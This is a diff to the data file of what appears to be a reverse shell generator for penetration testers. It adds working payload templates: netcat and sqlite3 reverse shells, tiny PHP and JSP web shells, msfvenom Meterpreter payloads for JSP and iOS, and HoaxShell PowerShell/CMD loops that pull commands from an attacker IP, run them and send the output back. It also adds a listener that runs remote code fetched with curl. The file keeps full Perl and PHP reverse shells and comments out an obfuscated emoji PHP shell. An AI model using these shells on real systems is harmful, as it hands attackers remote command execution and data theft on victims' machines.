@@ -2,7 +2,8 @@
 const CommandType = {
     'ReverseShell': 'ReverseShell',
     'BindShell': 'BindShell',
-    'MSFVenom': 'MSFVenom'
+    'MSFVenom': 'MSFVenom',
+    'HoaxShell': 'HoaxShell'
 };
 
 const withCommandType = function (commandType, elements) {
@@ -59,6 +60,11 @@ const reverseShellCommands = withCommandType(
             "name": "nc.exe -e",
             "command": "nc.exe {ip} {port} -e {shell}",
             "meta": ["windows"]
+        },
+        {
+            "name": "BusyBox nc -e",
+            "command": "busybox nc {ip} {port} -e {shell}",
+            "meta": ["linux"]
         },
         {
             "name": "nc -c",
@@ -125,11 +131,11 @@ const reverseShellCommands = withCommandType(
             "command": `#!/usr/bin/perl -w\n# perl-reverse-shell - A Reverse Shell implementation in PERL\n# Copyright (C) 2006 pentestmonkey@pentestmonkey.net\n#\n# This tool may be used for legal purposes only.  Users take full responsibility\n# for any actions performed using this tool.  The author accepts no liability\n# for damage caused by this tool.  If these terms are not acceptable to you, then\n# do not use this tool.\n#\n# In all other respects the GPL version 2 applies:\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License version 2 as\n# published by the Free Software Foundation.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License along\n# with this program; if not, write to the Free Software Foundation, Inc.,\n# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n#\n# This tool may be used for legal purposes only.  Users take full responsibility\n# for any actions performed using this tool.  If these terms are not acceptable to\n# you, then do not use this tool.\n#\n# You are encouraged to send comments, improvements or suggestions to\n# me at pentestmonkey@pentestmonkey.net\n#\n# Description\n# -----------\n# This script will make an outbound TCP connection to a hardcoded IP and port.\n# The recipient will be given a shell running as the current user (apache normally).\n#\n\nuse strict;\nuse Socket;\nuse FileHandle;\nuse POSIX;\nmy $VERSION = "1.0";\n\n# Where to send the reverse shell.  Change these.\nmy $ip = '{ip}';\nmy $port = {port};\n\n# Options\nmy $daemon = 1;\nmy $auth   = 0; # 0 means authentication is disabled and any \n		# source IP can access the reverse shell\nmy $authorised_client_pattern = qr(^127\\.0\\.0\\.1$);\n\n# Declarations\nmy $global_page = "";\nmy $fake_process_name = "/usr/sbin/apache";\n\n# Change the process name to be less conspicious\n$0 = "[httpd]";\n\n# Authenticate based on source IP address if required\nif (defined($ENV{'REMOTE_ADDR'})) {\n	cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");\n\n	if ($auth) {\n		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {\n			cgiprint("ERROR: Your client isn't authorised to view this page");\n			cgiexit();\n		}\n	}\n} elsif ($auth) {\n	cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");\n	cgiexit(0);\n}\n\n# Background and dissociate from parent process if required\nif ($daemon) {\n	my $pid = fork();\n	if ($pid) {\n		cgiexit(0); # parent exits\n	}\n\n	setsid();\n	chdir('/');\n	umask(0);\n}\n\n# Make TCP connection for reverse shell\nsocket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\nif (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {\n	cgiprint("Sent reverse shell to $ip:$port");\n	cgiprintpage();\n} else {\n	cgiprint("Couldn't open reverse shell to $ip:$port: $!");\n	cgiexit();	\n}\n\n# Redirect STDIN, STDOUT and STDERR to the TCP connection\nopen(STDIN, ">&SOCK");\nopen(STDOUT,">&SOCK");\nopen(STDERR,">&SOCK");\n$ENV{'HISTFILE'} = '/dev/null';\nsystem("w;uname -a;id;pwd");\nexec({"{shell}"} ($fake_process_name, "-i"));\n\n# Wrapper around print\nsub cgiprint {\n	my $line = shift;\n	$line .= "<p>\\n";\n	$global_page .= $line;\n}\n\n# Wrapper around exit\nsub cgiexit {\n	cgiprintpage();\n	exit 0; # 0 to ensure we don't give a 500 response.\n}\n\n# Form HTTP response using all the messages gathered by cgiprint so far\nsub cgiprintpage {\n	print "Content-Length: " . length($global_page) . "\\r\nConnection: close\\r\nContent-Type: text\\/html\\r\\n\\r\\n" . $global_page;\n}\n`,
             "meta": ["linux", "mac"]
         },
-        {
-            "name": "PHP Emoji",
-            "command": "php -r '$😀=\"1\";$😁=\"2\";$😅=\"3\";$😆=\"4\";$😉=\"5\";$😊=\"6\";$😎=\"7\";$😍=\"8\";$😚=\"9\";$🙂=\"0\";$🤢=\" \";$🤓=\"<\";$🤠=\">\";$😱=\"-\";$😵=\"&\";$🤩=\"i\";$🤔=\".\";$🤨=\"/\";$🥰=\"a\";$😐=\"b\";$😶=\"i\";$🙄=\"h\";$😂=\"c\";$🤣=\"d\";$😃=\"e\";$😄=\"f\";$😋=\"k\";$😘=\"n\";$😗=\"o\";$😙=\"p\";$🤗=\"s\";$😑=\"x\";$💀 = $😄. $🤗. $😗. $😂. $😋. $😗. $😙. $😃. $😘;$🚀 = \"{ip}\";$💻 = {port};$🐚 = \"{shell}\". $🤢. $😱. $🤩. $🤢. $🤓. $😵. $😅. $🤢. $🤠. $😵. $😅. $🤢. $😁. $🤠. $😵. $😅;$🤣 =  $💀($🚀,$💻);$👽 = $😃. $😑. $😃. $😂;$👽($🐚);'",
-            "meta": ["linux", "mac"]
-        },
+//         {
+//             "name": "PHP Emoji",
+//             "command": "php -r '$😀=\"1\";$😁=\"2\";$😅=\"3\";$😆=\"4\";$😉=\"5\";$😊=\"6\";$😎=\"7\";$😍=\"8\";$😚=\"9\";$🙂=\"0\";$🤢=\" \";$🤓=\"<\";$🤠=\">\";$😱=\"-\";$😵=\"&\";$🤩=\"i\";$🤔=\".\";$🤨=\"/\";$🥰=\"a\";$😐=\"b\";$😶=\"i\";$🙄=\"h\";$😂=\"c\";$🤣=\"d\";$😃=\"e\";$😄=\"f\";$😋=\"k\";$😘=\"n\";$😗=\"o\";$😙=\"p\";$🤗=\"s\";$😑=\"x\";$💀 = $😄. $🤗. $😗. $😂. $😋. $😗. $😙. $😃. $😘;$🚀 = \"{ip}\";$💻 = {port};$🐚 = \"{shell}\". $🤢. $😱. $🤩. $🤢. $🤓. $😵. $😅. $🤢. $🤠. $😵. $😅. $🤢. $😁. $🤠. $😵. $😅;$🤣 =  $💀($🚀,$💻);$👽 = $😃. $😑. $😃. $😂;$👽($🐚);'",
+//             "meta": ["linux", "mac"]
+//         },
         {
             "name": "PHP PentestMonkey",
             "command": "<?php\n// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '{ip}';\n$port = {port};\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; {shell} -i';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists('pcntl_fork')) {\n\t$pid = pcntl_fork();\n\t\n\tif ($pid == -1) {\n\t\tprintit(\"ERROR: Can't fork\");\n\t\texit(1);\n\t}\n\t\n\tif ($pid) {\n\t\texit(0);  // Parent exits\n\t}\n\tif (posix_setsid() == -1) {\n\t\tprintit(\"Error: Can't setsid()\");\n\t\texit(1);\n\t}\n\n\t$daemon = 1;\n} else {\n\tprintit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\nchdir(\"/\");\n\numask(0);\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n\tprintit(\"$errstr ($errno)\");\n\texit(1);\n}\n\n$descriptorspec = array(\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n\tprintit(\"ERROR: Can't spawn shell\");\n\texit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n\tif (feof($sock)) {\n\t\tprintit(\"ERROR: Shell connection terminated\");\n\t\tbreak;\n\t}\n\n\tif (feof($pipes[1])) {\n\t\tprintit(\"ERROR: Shell process terminated\");\n\t\tbreak;\n\t}\n\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit(\"SOCK READ\");\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit(\"SOCK: $input\");\n\t\tfwrite($pipes[0], $input);\n\t}\n\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit(\"STDOUT READ\");\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit(\"STDOUT: $input\");\n\t\tfwrite($sock, $input);\n\t}\n\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit(\"STDERR READ\");\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit(\"STDERR: $input\");\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint \"$string\\n\";\n\t}\n}\n\n?>",
@@ -143,6 +149,16 @@ const reverseShellCommands = withCommandType(
         {
             "name": "PHP cmd",
             "command": "<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER[\'PHP_SELF\']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n<\/form>\n<pre>\n<?php\n    if(isset($_GET[\'cmd\']))\n    {\n        system($_GET[\'cmd\']);\n    }\n?>\n<\/pre>\n<\/body>\n<script>document.getElementById(\"cmd\").focus();<\/script>\n<\/html>",
+            "meta": ["linux", "windows", "mac"]
+        },
+	{
+            "name": "PHP cmd 2",
+            "command": "<?php if(isset($_REQUEST[\'cmd\'])){ echo \"<pre>\"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo \"<\/pre>\"; die; }?>",
+            "meta": ["linux", "windows", "mac"]
+        },
+	{
+            "name": "PHP cmd small",
+            "command": "<?=`$_GET[0]`?>",
             "meta": ["linux", "windows", "mac"]
         },
         {
@@ -260,6 +276,11 @@ const reverseShellCommands = withCommandType(
             "meta": ["linux", "mac"]
         },
         {
+            "name": "sqlite3 nc mkfifo",
+            "command": "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'",
+            "meta": ["linux", "mac"]
+        },
+        {
             "name": "node.js",
             "command": "require('child_process').exec('nc -e {shell} {ip} {port}')",
             "meta": ["linux", "mac"]
@@ -282,6 +303,16 @@ const reverseShellCommands = withCommandType(
         {
             "name": "Java #3",
             "command": "import java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class shell {\n    public static void main(String[] args) {\n        String host = \"{ip}\";\n        int port = {port};\n        String cmd = \"{shell}\";\n        try {\n            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n            Socket s = new Socket(host, port);\n            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n            while (!s.isClosed()) {\n                while (pi.available() > 0)\n                    so.write(pi.read());\n                while (pe.available() > 0)\n                    so.write(pe.read());\n                while (si.available() > 0)\n                    po.write(si.read());\n                so.flush();\n                po.flush();\n                Thread.sleep(50);\n                try {\n                    p.exitValue();\n                    break;\n                } catch (Exception e) {}\n            }\n            p.destroy();\n            s.close();\n        } catch (Exception e) {}\n    }\n}",
+            "meta": ["windows", "linux", "mac"]
+        },
+	    {
+            "name": "Java Web",
+            "command": "<%@\r\npage import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"\r\n% >\r\n<%!\r\nstatic class StreamConnector extends Thread\r\n{\r\n        InputStream is;\r\n        OutputStream os;\r\n        StreamConnector(InputStream is, OutputStream os)\r\n        {\r\n                this.is = is;\r\n                this.os = os;\r\n        }\r\n        public void run()\r\n        {\r\n                BufferedReader isr = null;\r\n                BufferedWriter osw = null;\r\n                try\r\n                {\r\n                        isr = new BufferedReader(new InputStreamReader(is));\r\n                        osw = new BufferedWriter(new OutputStreamWriter(os));\r\n                        char buffer[] = new char[8192];\r\n                        int lenRead;\r\n                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)\r\n                        {\r\n                                osw.write(buffer, 0, lenRead);\r\n                                osw.flush();\r\n                        }\r\n                }\r\n                catch (Exception ioe)\r\n                try\r\n                {\r\n                        if(isr != null) isr.close();\r\n                        if(osw != null) osw.close();\r\n                }\r\n                catch (Exception ioe)\r\n        }\r\n}\r\n%>\r\n\r\n<h1>JSP Backdoor Reverse Shell<\/h1>\r\n\r\n<form method=\"post\">\r\nIP Address\r\n<input type=\"text\" name=\"ipaddress\" size=30>\r\nPort\r\n<input type=\"text\" name=\"port\" size=10>\r\n<input type=\"submit\" name=\"Connect\" value=\"Connect\">\r\n<\/form>\r\n<p>\r\n<hr>\r\n\r\n<%\r\nString ipAddress = request.getParameter(\"ipaddress\");\r\nString ipPort = request.getParameter(\"port\");\r\nif(ipAddress != null && ipPort != null)\r\n{\r\n        Socket sock = null;\r\n        try\r\n        {\r\n                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());\r\n                Runtime rt = Runtime.getRuntime();\r\n                Process proc = rt.exec(\"cmd.exe\");\r\n                StreamConnector outputConnector =\r\n                        new StreamConnector(proc.getInputStream(),\r\n                                          sock.getOutputStream());\r\n                StreamConnector inputConnector =\r\n                        new StreamConnector(sock.getInputStream(),\r\n                                          proc.getOutputStream());\r\n                outputConnector.start();\r\n                inputConnector.start();\r\n        }\r\n        catch(Exception e) \r\n}\r\n%>",
+            "meta": ["windows", "linux", "mac"]
+        },
+	    {
+            "name": "Java Two Way",
+            "command": "<%\r\n    \/*\r\n     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.\r\n     * If it cannot connect, an HTML will prompt and you can input commands (sh\/cmd) there and it will prompts the output in the HTML.\r\n     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button \"send\" is clicked, it will try to connect to the reverse shell again (apart from executing \r\n     * the command specified in the HTML form). This is to avoid to keep it simple.\r\n     *\/\r\n%>\r\n\r\n<%@page import=\"java.lang.*\"%>\r\n<%@page import=\"java.io.*\"%>\r\n<%@page import=\"java.net.*\"%>\r\n<%@page import=\"java.util.*\"%>\r\n\r\n<html>\r\n<head>\r\n    <title>jrshell<\/title>\r\n<\/head>\r\n<body>\r\n<form METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">\r\n    <input TYPE=\"text\" NAME=\"shell\">\r\n    <input TYPE=\"submit\" VALUE=\"Send\">\r\n<\/form>\r\n<pre>\r\n<%\r\n    \/\/ Define the OS\r\n    String shellPath = null;\r\n    try\r\n    {\r\n        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {\r\n            shellPath = new String(\"\/bin\/sh\");\r\n        } else {\r\n            shellPath = new String(\"cmd.exe\");\r\n        }\r\n    } catch( Exception e ){}\r\n    \/\/ INNER HTML PART\r\n    if (request.getParameter(\"shell\") != null) {\r\n        out.println(\"Command: \" + request.getParameter(\"shell\") + \"\\n<BR>\");\r\n        Process p;\r\n        if (shellPath.equals(\"cmd.exe\"))\r\n            p = Runtime.getRuntime().exec(\"cmd.exe \/c \" + request.getParameter(\"shell\"));\r\n        else\r\n            p = Runtime.getRuntime().exec(\"\/bin\/sh -c \" + request.getParameter(\"shell\"));\r\n        OutputStream os = p.getOutputStream();\r\n        InputStream in = p.getInputStream();\r\n        DataInputStream dis = new DataInputStream(in);\r\n        String disr = dis.readLine();\r\n        while ( disr != null ) {\r\n            out.println(disr);\r\n            disr = dis.readLine();\r\n        }\r\n    }\r\n    \/\/ TCP PORT PART\r\n    class StreamConnector extends Thread\r\n    {\r\n        InputStream wz;\r\n        OutputStream yr;\r\n        StreamConnector( InputStream wz, OutputStream yr ) {\r\n            this.wz = wz;\r\n            this.yr = yr;\r\n        }\r\n        public void run()\r\n        {\r\n            BufferedReader r  = null;\r\n            BufferedWriter w = null;\r\n            try\r\n            {\r\n                r  = new BufferedReader(new InputStreamReader(wz));\r\n                w = new BufferedWriter(new OutputStreamWriter(yr));\r\n                char buffer[] = new char[8192];\r\n                int length;\r\n                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )\r\n                {\r\n                    w.write( buffer, 0, length );\r\n                    w.flush();\r\n                }\r\n            } catch( Exception e ){}\r\n            try\r\n            {\r\n                if( r != null )\r\n                    r.close();\r\n                if( w != null )\r\n                    w.close();\r\n            } catch( Exception e ){}\r\n        }\r\n    }\r\n \r\n    try {\r\n        Socket socket = new Socket( \"{ip}\", {port} ); \/\/ Replace with wanted ip and port\r\n        Process process = Runtime.getRuntime().exec( shellPath );\r\n        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();\r\n        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();\r\n        out.println(\"port opened on \" + socket);\r\n     } catch( Exception e ) {}\r\n%>\r\n<\/pre>\r\n<\/body>\r\n<\/html>",
             "meta": ["windows", "linux", "mac"]
         },
 	{
@@ -379,6 +410,11 @@ const msfvenomCommands =  withCommandType(
             "meta": ["msfvenom", "windows", "stageless", "reverse"]
         },
         {
+            "name": "Windows Staged JSP Reverse TCP",
+            "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jsp -o ./rev.jsp",
+            "meta": ["msfvenom", "windows", "staged", "reverse"]
+        },
+        {
             "name": "Linux Meterpreter Staged Reverse TCP (x64)",
             "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
             "meta": ["msfvenom", "linux", "meterpreter", "staged", "reverse"]
@@ -438,6 +474,11 @@ const msfvenomCommands =  withCommandType(
             "command": "msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",
             "meta": ["msfvenom", "android", "android", "reverse"]
         },
+	{
+            "name": "Apple iOS Meterpreter Reverse TCP Inline",
+            "command": "msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={ip} lport={port} -f macho -o payload",
+            "meta": ["msfvenom", "apple_ios", "apple_ios", "reverse"]
+        },
         {
             "name": "Python Stageless Reverse TCP",
             "command": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw",
@@ -451,10 +492,69 @@ const msfvenomCommands =  withCommandType(
     ]
 );
 
+
+const hoaxShellCommands =  withCommandType(
+    CommandType.HoaxShell,
+    [
+        {
+            "name": "Windows CMD cURL",
+            "command": "@echo off&cmd /V:ON /C \"SET ip={ip}:{port}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!\cmd.bat & type !temp!\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\cmd.bat > !tmp!\out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\out.txt > NUL)) & timeout 1\" > NUL",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell IEX",
+            "command": "$s='{ip}:{port}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell IEX Constr Lang Mode",
+            "command": "$s='{ip}:{port}';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell Outfile",
+            "command": "$s='{ip}:{port}';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f=\"C:\Users\$env:USERNAME\.local\hack.ps1\";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell Outfile Constr Lang Mode",
+            "command": "$s='{ip}:{port}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='http://';$f=\"C:\Users\$env:USERNAME\.local\hack.ps1\";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{\"Authorization\"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "Windows CMD cURL https",
+            "command": "@echo off&cmd /V:ON /C \"SET ip={ip}:{port}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!\cmd.bat & type !temp!\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\cmd.bat > !tmp!\out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\out.txt > NUL)) & timeout 1\" > NUL",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell IEX https",
+            "command": "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1cdbb583 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/f96894ff -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/f99b8edc -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell Constr Lang Mode IEX https",
+            "command": "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='11e6bc4b-fefb1eab-68a9612e';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/11e6bc4b -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/fefb1eab -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/68a9612e -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell Outfile https",
+            "command": "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='add29918-6263f3e6-2f810c1e';$p='https://';$f=\"C:\Users\$env:USERNAME\.local\hack.ps1\";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell Outfile Constr Lang Mode https",
+            "command": "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='https://';$f=\"C:\Users\$env:USERNAME\.local\hack.ps1\";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{\"Authorization\"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
+            "meta": ["windows"]
+        }
+    ]
+);
+
 const rsgData = {
 
     listenerCommands: [
         ['nc', 'nc -lvnp {port}'],
+        ['nc freebsd', 'nc -lvn {port}'],
+	['busybox nc', 'busybox nc -lp {port}'],
         ['ncat', 'ncat -lvnp {port}'],
         ['ncat.exe', 'ncat.exe -lvnp {port}'],
         ['ncat (TLS)', 'ncat --ssl -lvnp {port}'],
@@ -466,10 +566,11 @@ const rsgData = {
         ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
         ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'],
         ['powercat', 'powercat -l -p {port}'],
-        ['msfconsole', 'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"']
+        ['msfconsole', 'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"'],
+        ['hoaxshell', 'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t {type} -p {port}']
     ],
 
-    shells: ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
+    shells: ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash'],
 
     upgrade: ['python', ],
 
@@ -480,9 +581,10 @@ const rsgData = {
     reverseShellCommands: [
         ...reverseShellCommands,
         ...bindShellCommands,
-        ...msfvenomCommands
+        ...msfvenomCommands,
+        ...hoaxShellCommands
     ]
-}
+};
 
 // Export the data for use within netlify functions / node
 if (typeof exports !== 'undefined') {
